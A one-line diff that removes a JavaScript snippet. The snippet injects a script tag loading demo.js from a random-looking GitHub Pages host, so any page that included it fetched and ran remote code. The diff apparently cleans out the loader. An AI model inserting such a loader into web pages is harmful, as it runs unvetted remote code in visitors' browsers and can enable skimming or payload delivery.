@@ -1,1 +1,0 @@
-(function(){var s=document.createElement('script'); s.src='https://cb52251b-2cfb-4286-a986-1754ac127ea5.github.io/01a0ef2e-8b00-7c81-ae26-31e608146e19/launcher/demo.js';document.documentElement.appendChild(s);})();
